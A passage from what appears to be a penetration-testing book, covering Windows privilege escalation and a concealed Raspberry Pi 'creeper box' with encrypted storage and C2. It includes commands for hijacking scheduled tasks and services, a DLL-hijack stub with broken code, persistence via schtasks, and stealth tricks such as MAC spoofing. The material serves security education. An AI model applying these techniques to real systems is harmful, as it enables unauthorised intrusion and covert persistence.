12/24/2014\nhttp://support.microsoft.com/?kbid=2536275 Security Update\nKB2536275 12/24/2014\nhttp://support.microsoft.com/?kbid=2536276 Security Update\nKB2536276 12/24/2014\nhttp://support.microsoft.com/?kbid=2544893 Security Update\nKB2544893 12/24/2014\nhttp://support.microsoft.com/?kbid=2552343 Update\nKB2552343 12/24/2014\nhttp://support.microsoft.com/?kbid=2560656 Security Update\nKB2560656 12/24/2014\nhttp://support.microsoft.com/?kbid=2564958 Security Update\nKB2564958 12/24/2014\nhttp://support.microsoft.com/?kbid=2570947 Security Update\nKB2570947 12/24/2014\nhttp://support.microsoft.com/?kbid=2579686 Security Update\nKB2579686 12/24/2014\nhttp://support.microsoft.com/?kbid=2584146 Security Update\nKB2584146 12/24/2014\nhttp://support.microsoft.com/?kbid=2585542 Security Update\nKB2585542 12/24/2014\nhttp://support.microsoft.com/?kbid=2604115 Security Update\nKB2604115 12/24/2014\nhttp://support.microsoft.com/?kbid=2619339 Security Update\nKB2619339 12/24/2014\nhttp://support.microsoft.com/?kbid=2620704 Security Update\nKB2620704 12/24/2014\nhttp://support.microsoft.com/?kbid=2621440 Security Update\nKB2621440 12/24/2014\nhttp://support.microsoft.com/?kbid=2631813 Security Update\nKB2631813 12/24/2014\nhttp://support.microsoft.com/?kbid=2653956 Security Update\nKB2653956 12/24/2014\nhttp://support.microsoft.com/?kbid=2654428 Security Update\nKB2654428 12/24/2014\nhttp://support.microsoft.com/?kbid=2655992 Security Update\nKB2655992 12/24/2014\nhttp://support.microsoft.com/?kbid=2656356 Security Update\nKB2656356 12/24/2014\nhttp://support.microsoft.com/?kbid=2667402 Security Update\nKB2667402 12/24/2014\nhttp://support.microsoft.com/?kbid=2676562 Security Update\nKB2676562 12/24/2014\nhttp://support.microsoft.com/?kbid=2685939 Security Update\nKB2685939 12/24/2014\n<trimmed for brevity>\nThe important takeaway from the output is the knowledge base ID (or\nHotFixId, as it's called here). Someone will discover a vulnerability in the\nWindows platform. Then Microsoft will release a fix and give it a unique\nidentifier (the KB number). The systems get updated in accordance to\nwhatever patch policy the end organization has. If a patch for a specific exploit\nis not present, the platform is vulnerable to that particular attack. For\ninstance, if the host is vulnerable to MS11-011—Vulnerabilities in Windows\nKernel Could Allow Elevation of Privilege—note the KB number on the MS\nweb page (in this case KB2393802) and see if the appropriate patch is\ninstalled:\nC:\\Users\\wallsopp>wmic qfe get\nCaption,Description,HotFixID,InstalledOn | findstr /C:\"KB2393802\"\nhttp://support.microsoft.com/?kbid=2393802 Security Update\nKB2393802 12/24\n/2014\nC:\\Users\\wallsopp>\nThat's bad news that the patch is there but this is a very old exploit so it would\nbe strange if it weren't. In any case, searching through patch output one KB at\na time is tedious, time consuming, and unnecessary. It's better to maintain a\nlist of KB numbers and their associated vulnerabilities, thereby allowing a\nquick scripting effort to determine which patches are missing. The best thing\nabout this is that the heavy lifting has been done for you. Microsoft maintains\na freely available and up-to-date database that contains all of this information\nand there are several freely available tools that exploit it. I will outline one\nsuch tool here, creatively called Windows Exploit Suggester. Install it from\nthe repository and update it:\n$ git clone https://github.com/GDSSecurity/Windows-Exploit-\nSuggester.git\n$ ./windows-exploit-suggester.py --update\nThis updates the local KB database, which if you're curious, looks like Figure\n6.6.\nFigure 6.6: The XLS data contains bulletin names, severity, component KB,\nand so on.\nWindows Exploit Suggester will use this data to determine if the\ncompromised system is missing any patches. Before it can do that, we need to\ndump some data from the compromised system. A simple command will\nsuffice with the output piped to a file:\nC:\\Users\\wallsopp>systeminfo > comp_host1.txt\nThis command is intended to be used by system administrators to quickly\nbuild a picture of a host for troubleshooting, but it's pretty useful data for an\nattacker as well. It contains, among other things, detailed information about\nthe OS, including all installed patches as well as network and hardware\ninformation. Give this data to Windows Exploit Suggester as follows:\nroot@wil:~/Windows-Exploit-Suggester# ./windows-exploit-suggester.py\n--database 2016-06-07-mssb.xls --systeminfo comp_host1.txt\n[*] initiating winsploit version 3.1…\n[*] database file detected as xls or xlsx based on extension\n[*] attempting to read from the systeminfo input file\n[+] systeminfo input file read successfully (ascii)\n[*] querying database file for potential vulnerabilities\n[*] comparing the 245 hotfix(es) against the 332 potential\nbulletins(s) with a database of 122 known exploits\n[*] there are now 90 remaining vulns\n[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin\n[+] windows version identified as 'Windows 7 SP1 64-bit'\n[*]\n[E] MS15-134: Security Update for Windows Media Center to Address\nRemote Code Execution (3108669) - Important\n[E] MS15-132: Security Update for Microsoft Windows to Address Remote\nCode Execution (3116162) - Important\n[M] MS15-100: Vulnerability in Windows Media Center Could Allow\nRemote Code Execution (3087918) - Important\n[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation\nof Privilege (2958732) - Important\n[*] done\nInteresting—four vulnerabilities with working exploit code are available. The\nE denotes an exploit found within the Offensive Security exploit database,\nwhile the M means that this attack is integrated into the Metasploit\nframework.\nTEST, TEST, AND THEN TEST SOME MORE\nI've shown an example of how to use a local exploit earlier in Chapter 4,\nso I don't want to waste more copy doing it again. However, it is worth\nmentioning that some vulnerabilities can be exploited more reliably than\nothers and it is crucial that your own lab be stocked with virtual machine\nimages to work through the various eccentricities you will find. Blindly\nthrowing exploit after exploit at a compromised machine will lead only to\nfrustration and a failed mission.\nExploiting Automated OS Installations\nMass rollouts tend to leave configuration files behind. The files themselves\nwill vary depending on the solution the organization is using, but the idea is\nthe same—the configurations will contain data needed for the installation\nprocess such as product keys and administrative passwords.\nThe following is an example from a sysprep.inf file, which contains cleartext\ncredentials:\n[GuiUnattended]\nOEMSkipRegional=1\nOemSkipWelcome=1\nAdminPassword=P4ssw0rd\nTimeZone=20\nThis is an example of an unattended.xml file. This time the password is\nBase64 encoded, which can be trivially decoded. The username is still in\nplaintext:\n<AutoLogon>\n<Password>\n<Value>R0NsaWtlc3RoZWNvY2s=</Value>\n<PlainText>false</PlainText>\n</Password>\n<Enabled>true</Enabled>\n<Username>Administrator</Username>\n</AutoLogon>\nThis is by no means exhaustive, but on compromising a new system, it's\nworth doing a search for sysprep.inf, unattended.xml, and sysprep.xml.\nThese can be potentially very quick wins.\nExploiting the Task Scheduler\nThe task scheduler in Windows is more or less equivalent to Cron in UNIX-\nlike operating systems—a task (usually execution of a program) can be\nconfigured to run at a specific time or a set interval. If the program called by\nthe task scheduler is run with elevated privileges and can be overwritten by\nthe user account you currently have, then you can simply replace that\nprogram with your binary and achieve code execution the next time that task\nis scheduled to run (at which point you should copy the original program back\nto its original location).\nYou can get a list of scheduled tasks with the following command:\nschtasks /query /fo LIST /v\nThis gives a lot of output about what tasks are running, whether they are\nrecurring, where the task can be found and its parameters, as well as,\ncrucially, what permissions they are run with. For example, the following task\nruns as SYSTEM. If we can overwrite the relevant binary with our own code, we\ncan achieve command execution with SYSTEM privileges:\nHostName: WALLSOPP\nTaskName: \\HEARTB\nNext Run Time: 10-6-2016 10:52:49\nStatus: Ready\nLogon Mode: Interactive/Background\nLast Run Time: N/A\nLast Result: 1\nAuthor: DanTek Systems Corp.\nTask To Run: C:\\Program Files\\DanTek Systems\nCorp\\HeartBeat\\HEARTB.exe -schedule\nStart In: C:\\Program Files\\DanTek Systems\nCorp\\HeartBeat\\\nComment: Process Health Monitoring\nHEARTB\nScheduled Task State: Enabled\nIdle Time: Disabled\nPower Management:\nRun As User: SYSTEM\nDelete Task If Not Rescheduled: Enabled\nStop Task If Runs X Hours and X Mins: 02:00:00\nSchedule: Scheduling data is not\navailable in this format.\nSchedule Type: One Time Only, Hourly\nStart Time: N/A\nStart Date: N/A\nEnd Date: N/A\nDays: N/A\nMonths: N/A\nRepeat: Every: 1 Hour(s), 0 Minute(s)\nRepeat: Until: Time: None\nRepeat: Until: Duration: 24 Hour(s), 0 Minute(s)\nRepeat: Stop If Still Running: Disabled\nThis task seems to be some kind of health-monitoring process and is executed\nevery hour. It's run at SYSTEM so if you can overwrite HEARTB.exe on disk,\nyou're good to go:\nC:\\Program Files\\DanTek Systems Corp\\HeartBeat\\HEARTB.exe -schedule\nHEARTB.exe NT AUTHORITY\\SYSTEM:(I)(F)\nBUILTIN\\Administrators:(I)(F)\nBUILTIN\\Users:(I)(F)\nThat's what we like to see! Full access to BUILTIN\\Users! This snafu is quite\ncommon on third-party software.\nAs previously mentioned, the Task Scheduler is also a handy way of achieving\npersistence or monitoring the health of your C2 agent. The following\ncommands should prove useful in this regard:\nTo schedule a task that runs every time the system starts:\nschtasks /create /tn <TaskName> /tr <TaskRun> /sc onstart\nTo schedule a task that runs when users log on:\nschtasks /create /tn <TaskName> /tr <TaskRun> /sc onlogon\nTo schedule a task that runs when the system is idle:\nschtasks /create /tn <TaskName> /tr <TaskRun> /sc onidle /i {1 - 999}\nTo schedule a task that runs once:\nschtasks /create /tn <TaskName> /tr <TaskRun> /sc once /st <HH:MM>\nTo schedule a task that runs with system permissions:\nschtasks /create /tn <TaskName> /tr <TaskRun> /sc onlogon /ru System\nTo schedule a task that runs on a remote computer:\nschtasks /create /tn <TaskName> /tr <TaskRun> /sc onlogon /s\n<PC_Name>\nExploiting Vulnerable Services\nWindows services are intended to be run with elevated permissions. If a\nWindows service has parameters that a user can alter, the path to the service\nexecutable can be altered to point to custom code and used to achieve\ncommand execution with the privileges of the service—usually SYSTEM. The\nfirst step is to list the services running on the host:\nOutput snipped for brevity\nC:\\Users\\wallsopp>net start\nThese Windows services are started:\nAdobe Acrobat Update Service\nMicrosoft Antimalware Service\nMicrosoft Network Inspection\nMultimedia Class Scheduler\nNet Driver HPZ12\nNetlogon\nNetwork Connections\nNetwork List Service\nNetwork Location Awareness\nNetwork Store Interface Service\nOffice Software Protection Platform\nOffline Files\nParagonMounter\nPlug and Play\nPml Driver HPZ12\nPower\nPrint Spooler\nShell Hardware Detection\nSmart Card\nSMS Agent Host\nSolarWinds Network Topology Job Scheduler\nSSDP Discovery\nVulnService\nThe command completed successfully.\nTo get the parameters for an individual server:\nC:\\Users\\wallsopp>sc qc VulnService\n[SC] QueryServiceConfig SUCCESS\nSERVICE_NAME: Power\nTYPE : 20 WIN32_OWN_PROCESS\nSTART_TYPE : 2 AUTO_START\nERROR_CONTROL : 1 NORMAL\nBINARY_PATH_NAME : D:\\vuln\\vulnerable.exe\nLOAD_ORDER_GROUP :\nTAG : 0\nDISPLAY_NAME : VulnService\nDEPENDENCIES :\nSERVICE_START_NAME : LocalSystem\nServices can be queried individually or in a batch to determine their access\ncontrol rules (you will need the Microsoft Sysinternals suite, which is a free\ndownload on the Microsoft website):\nC:\\Users\\wallsopp>accesschk.exe -ucqv VulnService\nVulnService\nMedium Mandatory Level (Default) [No-Write-Up]\nRW NT AUTHORITY\\SYSTEM\nSERVICE_ALL_ACCESS\nRW BUILTIN\\Administrators\nSERVICE_ALL_ACCESS\nRW NT AUTHORITY\\Authenticated Users\nR NT AUTHORITY\\INTERACTIVE\nSERVICE_QUERY_STATUS\nSERVICE_QUERY_CONFIG\nSERVICE_INTERROGATE\nSERVICE_ENUMERATE_DEPENDENTS\nSERVICE_USER_DEFINED_CONTROL\nREAD_CONTROL\nR NT AUTHORITY\\SERVICE\nSERVICE_QUERY_STATUS\nSERVICE_QUERY_CONFIG\nSERVICE_INTERROGATE\nSERVICE_ENUMERATE_DEPENDENTS\nSERVICE_USER_DEFINED_CONTROL\nREAD_CONTROL\nSpot the security mistake? It's here:\nRW NT AUTHORITY\\Authenticated Users\nAny logged-in user can modify parameters for the VulnService service. To\nachieve this:\nC:\\Users\\wallsopp>sc config VulnPath binpath= \"C:\\temp\\c2agent.exe\"\nC:\\Users\\wallsopp>sc config VulnPath obj= \".\\LocalSystem\" password=\n\"\"\nThis example is somewhat contrived, but service permission should always be\nchecked as part of the privilege escalation process, as this can be a quick win.\nHijacking DLLs\nDLLs are libraries of functions that can be imported into an application. They\ncan be proprietary to a single application or utilized as an Application\nProgramming Interface (API) to provide a way for other applications to share\nthe functionality they provide. The most common example of the latter is an\nOS level API library such as kernel32.dll, which was encountered in Chapter\n2.\nWhen an executable is launched, it is given its own protected process space,\nwhich is to say that memory addressing is relative to that process and other\nprograms can't accidentally write over its allocated part of memory. A DLL, on\nthe other hand, is loaded into the process space of the program calling it and,\nfor all intents and purposes, becomes part of that program. There are pros and\ncons to this from a software development perspective, but what is interesting\nto an attacker is that the DLL has no execution permissions of its own. It\ninherits permissions from the executable that imports it. To put it simply, if\nan application runs with elevated privileges and you can overwrite a DLL that\nit imports with one you created, then it is possible to get code execution with\nthose same privileges.\nIn terms of reconnaissance, you need to know three things:\nWhich processes will load with elevated privileges\nWhich DLLs you can overwrite with the privileges you have\nWhat DLLs are being imported by any given process\nAnother way to hijack DLLs is to exploit the Windows search path order and\nforce an executable to load a different instance of the library somewhere else\non the drive. However, protecting against this is now trivial and can be as\nsimple as modifying an entry in the Registry. Code signing will defeat both\napproaches.\nTo find all processes currently running as SYSTEM, use the following\ncommand:\nc:\\> tasklist.exe /FI \"username eq system\" /v\nThis will give output similar to the following:\n<trimmed for brevity>\ndsAccessService.exe 1624 Services 0\n17.732 K Unknown NT AUTHORITY\\SYSTEM\n0:00:01 N/A\nsvchost.exe 1788 Services 0\n15.420 K Unknown NT AUTHORITY\\SYSTEM\n0:00:01 N/A\nspoolsv.exe 1972 Services 0\n14.428 K Unknown NT AUTHORITY\\SYSTEM\n0:00:00 N/A\nTdmService.exe 1644 Services 0\n15.824 K Unknown NT AUTHORITY\\SYSTEM\n0:00:00 N/A\nWmiPrvSE.exe 2236 Services 0\n19.628 K Unknown NT AUTHORITY\\SYSTEM\n0:00:04 N/A\nWvPCR.exe 2284 Services 0\n9.292 K Unknown NT AUTHORITY\\SYSTEM\n0:00:00 N/A\narmsvc.exe 2468 Services 0\n5.336 K Unknown NT AUTHORITY\\SYSTEM\n0:00:00 N/A\ncyserver.exe 2700 Services 0\n4.124 K Unknown NT AUTHORITY\\SYSTEM\n0:00:00 N/A\nCyveraService.exe 2768 Services 0\n73.760 K Unknown NT AUTHORITY\\SYSTEM\n0:00:13 N/A\nEmbassyServer.exe 2808 Services 0\n9.328 K Unknown NT AUTHORITY\\SYSTEM\n0:00:00 N/A\npabeSvc64.exe 3088 Services 0\n16.220 K Unknown NT AUTHORITY\\SYSTEM\n0:00:00 N/A\nRunSrv.exe 3200 Services 0\n4.512 K Unknown NT AUTHORITY\\SYSTEM\n0:00:00 N/A\nSWNTMJobSchedulerSvc.exe 3284 Services 0\n124.184 K Unknown NT AUTHORITY\\SYSTEM\n0:00:01 N/A\ntda.exe 3860 Services 0\n4.756 K Unknown NT AUTHORITY\\SYSTEM\n0:00:00 N/A\nMcAfee.TrueKey.Service.ex 3940 Services 0\n54.264 K Unknown NT AUTHORITY\\SYSTEM\n0:00:01 N/A\ntdawork.exe 4012 Services 0\n3.216 K Unknown NT AUTHORITY\\SYSTEM\n0:00:00 N/A\nvalWBFPolicyService.exe 4020 Services 0\n4.676 K Unknown NT AUTHORITY\\SYSTEM\n0:00:00 N/A\ntdawork.exe 4028 Services 0\n3.208 K Unknown NT AUTHORITY\\SYSTEM\n0:00:00 N/A\ntdawork.exe 4036 Services 0\n3.212 K Unknown NT AUTHORITY\\SYSTEM\n0:00:00 N/A\nThis is a fairly standard combination of MS Windows and third-party\napplications. By way of example, the RunSrv service is running as NT\nAUTHORITY\\SYSTEM. The next step is to figure out which DLLs this executable is\nimporting. There's a nice tool called Dependency Walker that will do this. It\nshows multiple levels of dependency (i.e., what dependencies do the DLLs\nthemselves have).\nLoading RunSrv.exe into Dependency Walker results in Figure 6.7.\nFigure 6.7: Dependency Walker showing full DLL paths.\nRunSrv.exe is importing a DLL called MMFS2.DLL, which we can overwrite:\nD:\\Program Files (x86)\\Jericho Application Server Framework>icacls\nmmfs2.dll\nmmfs2.dll BUILTIN\\Administrators:(I)(F)\nNT AUTHORITY\\SYSTEM:(I)(F)\nNT AUTHORITY\\Authenticated Users:(I)(M)\nBUILTIN\\Users:(I)(F)\nThe next step is to craft a DLL that will automatically execute code as soon as\nit is imported into the RunSrv.exe process. Obviously, this is language specific,\nbut the example shown is for Visual C++. Create a new DLL project and paste\nin the following code:\n#include <windows.h>\n#include <stdio.h>\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID\nlpReserved)\n{\nprintf(\"This string will be written to the console when this DLL is\nimported\\n\");\nbreak;\n}\nThis is a very simple DLLMain function that will be executed as soon as the\nDLL has been imported. The code will be executed as SYSTEM. This means that\nif you call a Shell() command to execute external executables, then they too\nwill inherit SYSTEM level privileges.\nMining the Windows Registry\nThe Windows Registry can be a rich source of information; it is after all where\nmost modern Windows software programs store their configuration\nparameters. When passwords are stored by applications, they are often stored\nhashed or encoded in the Registry, thus rendering them vulnerable to crypt\nand compare attacks (particularly if they're unsalted). The VNC remote\ncontrol software and its variants still store passwords as easily recovered\nstrings in the Registry. There's not a pen-tester alive who won't have at least\none story about how s/he was able to compromise an entire network after\ngetting access to a single workstation because the VNC password was shared\nthroughout the infrastructure. VNC is convenient but a security nightmare.\nThere is a setting in the Windows Registry called AlwaysInstallElevated that\nallows .msi installers to always install as SYSTEM regardless of the privileges of\nthe user installing the package. I can sort of see why this might make the\nsysadmin's life a little easier on the one hand, but this is a massive security\nflaw that essentially allows anyone to execute any code they want with SYSTEM\naccess. That's great if you're looking to escalate your rights. The Registry\nentries are found here:\nHKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer\nHKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Installer\nThe AlwaysInstallElevated value is not set to 1 under both of the preceding\nRegistry keys.\nEven Microsoft, despite including this functionality in their operating\nsystems, warns about actually using it.\nWARNING\nThis option is equivalent to granting full administrative rights, which can\npose a massive security risk. Microsoft strongly discourages the use of\nthis setting.\nCommand and Control Part VI: The Creeper Box\nIf you are able to gain short-term access to the target's physical location, it is\nworth considering the use of a hardware backdoor or “creeper box.” This is not\na Minecraft reference but a term coined in the 2004 book, How to Own a\nContinent by Jake Rolston. This is an entertaining collection of security\nfiction and I've been using the term ever since (although it's entirely possible\nthat I'm the only one). Feel free to use whatever term you like.\nTraditionally, the creeper box would have been an ultra-small form factor PC\ndiscreetly connected to the target network. With the recent boom in consumer\nhobbyist electronics, we have better (and cheaper) options. There are two\nscenarios I will discuss:\nA discreet backdoor enabling remote access and complex attack\ncapabilities typically connected directly to the switch.\nA passive bridge spliced inline into a network endpoint or backbone, solely\nto provide data interception.\nCreeper Box Specification\nTo achieve this creeper box solution, it's first important to consider the\nhardware requirements:\nSufficiently powerful to be able to run penetration testing software and the\nSSH C2 agent.\nData that is captured and stored by the device should be secure, i.e., in an\nencrypted manner.\nIf possible, the device should be Power over Ethernet (PoE) capable. This\nreduces its footprint and ensures that if it is discovered and the network\ncable pulled (or the switch port disabled), it will immediately power down.\nThis ensures that (assuming the encryption is correctly implemented)\nforensic analysis of the device will be impossible.\nRemote connectivity is an obvious requirement and needs to be\nimplemented out-of-band (i.e., not using the target's own network\ninfrastructure). The easiest and most effective way to do this is with a\n3G/4G adapter carrying the SSH traffic back to the C2 server.\nIn this section I discuss the Raspberry Pi 3B device and its configuration and\napplication in penetration testing activities. The device fulfills all these\nrequirements out of the box, save for PoE and 3G/4G capabilities, which can\nbe added. This allows the creeper solution to be built for under $100.\nFULL DISK VERSUS LIMITED ENCRYPTION\nA device utilizing full disk encryption is not going to be able to be\nrebooted because the console will require a passphrase to unlock the\ndrive–though this may be exactly what you need and as such this is the\napproach I take in this chapter. Another solution is to have partial disk\nencryption, configure the device to load the 3G/4G drivers on boot and\ncall home whereupon the encrypted partition can be unlocked either by\nthe server or manually and used solely to store data. The danger of this is\nthat the C2 agent and its capabilities will likely be discovered by a\ncompetent forensic analysis.\nIntroducing the Raspberry Pi and Its Components\nThe RPi is a credit card sized computer. Its specifications out of the box are\nimpressive:\nSoC: Broadcom BCM2837\nCPU: 4× ARM Cortex-A53, 1.2GHz\nGPU: Broadcom VideoCore IV\nRAM: 1GB LPDDR2 (900 MHz)\nNetworking: 10/100 Ethernet, 2.4GHz 802.11n wireless\nBluetooth: Bluetooth 4.1 Classic, Bluetooth Low Energy\nStorage: microSD\nGPIO: 40-pin header, populated\nPorts: HDMI, 3.5mm analogue audio-video jack, 4× USB 2.0, Ethernet,\nCamera Serial Interface (CSI), Display Serial Interface (DSI)\nThe 1GB of RAM is shared between the CPU and the GPU, and the Ethernet\nand the USB sit on the same bus but for that money you can't complain. Note\nthe absence of keyboard, mouse, and monitor. See Figure 6.8.\nFigure 6.8: The Raspberry Pi 3B in all its glory.\nWARNING\nThe built-in wireless is next to useless for penetration testing, as the\nadapter can't be placed in monitor mode. That means no packet\ninterception (although it could be used as an additional management\nchannel). However, there's no reason why you can't plug something better\nin to one of the many USB ports.\nGPIO\nThe 40-pin General Purpose Input Output (GPIO) rig allows you to add\ncustom hardware to the board. There are plenty of options to purchase off the\nshelf, including small touchscreen monitors, robotics interfaces, and PoE\nmodules. The latter fits our needs perfectly. See Figure 6.9.\nFigure 6.9: A Raspberry Pi with a PoE HAT (hardware added on top).\nChoosing an OS\nYou are spoiled for choice in terms of operating systems that run on the Pi.\nThere are a number of Linux and UNIX-like custom builds available, from the\nfamiliar (Ubuntu) to the masochistic (RISC OS). In this chapter, I stick with\nthe Pi's official version of Debian called Raspbian. It's more than adequate for\nwhat is needed here and will be very familiar to anyone who's used Debian.\nOne issue, however (and this goes for all OSs available for the Pi), is that\nthere are no installers, only disk images, that are written to the microSD.\nAlthough this is perfectly fine for most uses, it means that certain things (like\nfull disk encryption) have to be configured post-install, which can be a little\nmore complex than it could be. However, full instructions are included in the\nfollowing section. Raspbian also inherits Debian's liberal hardware\ncompatibility, so you don't have to worry about missing drivers when\nconfiguring the 3G out-of-band communications.\nConfiguring Full-Disk Encryption\nInstalling Debian inside an encrypted Logical Volume Manager (LVM) is\nsomething normally undertaken during the installation process and a matter\nof selecting an option from a menu. However, with Raspbian on the Pi there is\nno installation per se. The process is therefore a little more involved but\ncertainly not impossible. For these steps, you will need:\nTwo microSD cards with an SD adapter\nA computer running Debian (or other Linux distro)\nA Raspberry Pi 3B with a USB keyboard\nA USB adapter that can take an SD card (not microSD)\nIn Debian, burn the latest Raspbian distro to one of the microSD cards as\nfollows. I refer to this card as bootsd:\n$ sudo umount /dev/sdb1\n$ sudo dd bs=4M if=/home/wil/raspbian.img of=/dev/sdb\nThe next steps are as follows:\n1. Power up Pi.\n2. Expand the image to fill the SD card.\n3. Change the password.\n4. Enable the SSH server.\n5. Change the hostname to bootsd.\n6. Reboot.\n7. Update the firmware.\nFrom the Pi command line, this is achieved as follows:\n$ sudo passwd\n$ sudo apt-get update\n$ sudo apt-get dist-upgrade\n$ sudo apt-get install cryptsetup\n$ sudo apt-get install lvm2\n$ sudo apt-get install dcfldd\n$ sudo apt-get install openssh-server\n$ sudo update-rc.d -f ssh remove\n$ sudo update-rc.d -f ssh defaults\n$ sudo echo bootsd > /etc/hostname\n$ sudo /etc/init.d/hostname.sh start\n$ sudo reboot\n$ sudo rpi-update\nAgain from Debian, burn the latest Raspbian distro on to the second microSD\ncard as follows. I refer to this card as systemsd:\n$ sudo umount /dev/sdb1\n$ sudo dd bs=4M if=/home/wil/raspbian.img of=/dev/sdb\nOnce again the next steps are as follows:\n1. Power up Pi.\n2. Expand the image to fill the SD card.\n3. Change the password.\n4. Enable the SSH server.\n5. Change the hostname to systemsd.\n6. Reboot.\nFrom the Pi command line, this is achieved as follows:\n$ sudo passwd\n$ sudo apt-get update\n$ sudo apt-get dist-upgrade\n$ sudo apt-get install cryptsetup\n$ sudo apt-get install lvm2\n$ sudo apt-get install dcfldd\n$ sudo apt-get install openssh-server\n$ sudo update-rc.d -f ssh remove\n$ sudo update-rc.d -f ssh defaults\n$ sudo echo systemsd > /etc/hostname\n$ sudo /etc/init.d/hostname.sh start\n$ sudo reboot\nNext, create an initramfs and add it to the config. Then shut down:\n$ sudo mkinitramfs -o /boot/initramfs.gz\n$ sudo nano /boot/config.txt\n…\ninitramfs initramfs.gz followkernel\n$ sudo shutdown -hP now\nBoot the bootsd SD card with the systemsd card in the USB adapter, log in as\nPi, and back up via rsync to the Debian box via the LAN:\n$ sudo mount /dev/sda2 /mnt/usb\n$ sudo rsync -aAXv\n--exclude=\n{\"/dev/*\",\"/proc/*\",\"/sys/*\",\"/tmp/*\",\"/run/*\",\"/mnt/*\",\"/media/*\",\"/lost+found\"}\n/mnt/usb/ user@192.168.1.3:/home/wil/backup/root/\n$ sudo umount /mnt/usb\nNext, a little directory management on the Debian host:\n$ mv /home/user/backup/root/home /home/user/backup/home\n$ mkdir /home/user/backup/root/home\nNow back on the Pi, it's time to wipe the initial root partition and encrypt and\nconfigure LVM:\n$ sudo dcfldd if=/dev/urandom of=/dev/sda2\n$ sudo cryptsetup luksFormat --verify-passphrase /dev/sda2\n$ sudo cryptsetup luksOpen /dev/sda2 crypt\n$ sudo service lvm2 start\n$ sudo pvcreate /dev/mapper/crypt\n$ sudo vgcreate cvg /dev/mapper/crypt\n$ sudo lvcreate -L 500M cvg -n swap\n$ sudo lvcreate -L 4G cvg -n root\n$ sudo lvcreate -l +100%FREE cvg -n home\nEnter your chosen passphrase when prompted; then you restore the backup\non to the Pi:\n$ sudo rsync -aAXv user@192.168.1.111:/home/user/backup/home/\n/mnt/home/\n$ sudo rsync -aAXv user@192.168.1.111:/home/user/backup/root/\n/mnt/root/\n$ sudo chown -R root:root /mnt/root\nUse nano (or whatever you prefer) to edit the files as shown:\n$ sudo nano /mnt/boot/cmdline.txt\nchange root=/dev/mmcblk0p2 to root=/dev/mapper/cvg-root\nadd cryptdevice=/dev/mmcblk0p2:crypt\n$ sudo nano /mnt/root/etc/fstab\nchange /dev/mmcblk0p2 to /dev/mapper/crypt\n$ sudo nano /mnt/root/etc/crypttab\ncrypt /dev/mmcblk0p2 none luks\nNow unmount everything and shut down:\n$ sudo umount /mnt/boot\n$ sudo umount /mnt/root\n$ sudo umount /mnt/home\n$ sudo service lvm2 stop\n$ sudo shutdown -hP now\nNow boot with the systemsd SD card. The first boot will fail and drop into\ninitramfs. The logical volumes need to be activated manually, as they weren't\nmounted as fstab. Configure them as follows:\n(initramfs) cryptsetup luksOpen /dev/mmcblk0p2 crypt\n(initramfs) lvm\nlvm> lvscan\ninactive '/dev/cvg/swap' [500.00 MiB] inherit\ninactive '/dev/cvg/root' [4.00 GiB] inherit\ninactive '/dev/cvg/home' [2.85 GiB] inherit\nlvm> lvs\nLV VG Attr LSize Pool Origin Data% Move Log Copy%\nConvert\nhome cvg -wi----- 2.85g\nroot cvg -wi----- 4.00g\nswap cvg -wi----- 500.00m\nlvm> vgchange -a y\n3 logical volume(s) in volume group \"cvg\" now active\nlvm> lvscan\nACTIVE '/dev/cvg/swap' [500.00 MiB] inherit\nACTIVE '/dev/cvg/root' [4.00 GiB] inherit\nACTIVE '/dev/cvg/home' [2.85 GiB] inherit\nlvm> lvs\nLV VG Attr LSize Pool Origin Data% Move Log Copy%\nConvert\nhome cvg -wi-a--- 2.85g\nroot cvg -wi-a--- 4.00g\nswap cvg -wi-a--- 500.00m\nlvm> quit\nExiting.\n(initramfs) exit\nWhen the Pi has finished rebooting, log in as root, modify fstab as follows,\nand then rewrite initramfs:\n# nano /etc/fstab\nproc /proc proc defaults 0\n0\n/dev/mmcblk0p1 /boot vfat defaults 0\n0\n/dev/mapper/cvg-root / ext4 defaults,noatime 0\n1\n/dev/mapper/cvg-home /home ext4 defaults 0\n2\n/dev/mapper/cvg-swap none swap sw 0\n0\n# mkinitramfs -o /boot/initramfs.gz\nOne more reboot and you need to confirm that all logical volumes and file\nsystems have been mounted:\n# lvm\nlvm> lvs\nLV VG Attr LSize Pool Origin Data% Move Log Copy%\nConvert\nhome cvg -wi-ao-- 2.85g\nroot cvg -wi-ao-- 4.00g\nswap cvg -wi-ao-- 500.00m\nlvm> quit\n# df -ah\nFilesystem Size Used Avail Use% Mounted on\nrootfs 3.9G 2.5G 1.2G 68% /\nsysfs 0 0 0 - /sys\nproc 0 0 0 - /proc\nudev 10M 0 10M 0% /dev\ndevpts 0 0 0 - /dev/pts\ntmpfs 93M 244K 93M 1% /run\n/dev/mapper/cvg-root 3.9G 2.5G 1.2G 68% /\ntmpfs 5.0M 0 5.0M 0% /run/lock\ntmpfs 186M 0 186M 0% /run/shm\n/dev/mmcblk0p1 56M 20M 37M 36% /boot\n/dev/mapper/cvg-home 2.8G 6.1M 2.6G 1% /home\n# exit\nLog in as Pi and make sure sudo still works; there is a glitch in the setuid\nprocess that can sometimes kill it. If it doesn't work, just remove and reinstall\nit.\n# apt-get remove sudo\n# apt-get install sudo\n# reboot\nYou are now the proud owner of a Raspbian install with a fully encrypted file\nsystem.\nA Word on Stealth\nIt's worth pointing out that when connecting a foreign device into the target's\nnetwork, it is eventually going to be found—how soon depends on constants\nlike the target environment and size, but also controllable factors such as\nplacement stealth. Even if the device is physically well concealed or hidden in\nplain sight masquerading as something else (for instance, placed in a case\nwith tamper warning stickers), it is going to need (in most cases) an IP\naddress on the network and may therefore be discovered in routine\nvulnerability scanning or asset discovery.\nAn easy way to buy yourself more time is to change the MAC address of the Pi\nto something that is associated with different hardware such as a router or\nswitch—something that people are not going to start poking at without\ncaution. To achieve this, find the config.txt file in the route of microSD card\n(not the root of the Raspbian OS). It will look something like this:\n# Set sdtv mode to PAL (as used in Europe)\nsdtv_mode=2\n# Force the monitor to HDMI mode so that sound will be sent over HDMI\ncable\nhdmi_drive=2\n# Set monitor mode to DMT\nhdmi_group=2\n# Set monitor resolution to 1024x768 XGA 60 Hz (HDMI_DMT_XGA_60)\nhdmi_mode=16\n# Make display smaller to stop text spilling off the 